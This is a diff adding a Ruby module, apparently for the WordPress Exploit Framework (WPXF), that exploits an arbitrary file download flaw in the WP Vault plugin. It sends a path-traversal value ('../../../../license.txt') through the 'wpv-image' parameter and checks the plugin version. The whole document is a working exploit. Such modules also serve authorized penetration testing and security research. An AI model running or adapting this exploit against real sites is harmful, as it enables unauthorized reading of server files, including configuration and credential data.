@@ -1,0 +1,44 @@
+class Wpxf::Auxiliary::WpVaultFileDownload < Wpxf::Module
+  include Wpxf::WordPress::FileDownload
+
+  def initialize
+    super
+
+    update_info(
+      name: 'WP Vault File Download',
+      desc: %(
+        This module exploits a vulnerability which allows you to download any file
+        accessible by the user the web server is running as, with the exception of
+        PHP files.
+      ),
+      author: [
+        'Lenon Leite',                    # Disclosure
+        'Rob Carr <rob[at]rastating.com>' # WPXF module
+      ],
+      references: [
+        ['WPVDB', '8684']
+      ],
+      date: 'Nov 30 2016'
+    )
+  end
+
+  def check
+    check_plugin_version_from_readme('wp-vault')
+  end
+
+  def default_remote_file_path
+    '../../../../license.txt'
+  end
+
+  def working_directory
+    'wp-content/plugins/wp-vault/images/'
+  end
+
+  def downloader_url
+    full_uri
+  end
+
+  def download_request_params
+    { 'wpv-image' => remote_file }
+  end
+end
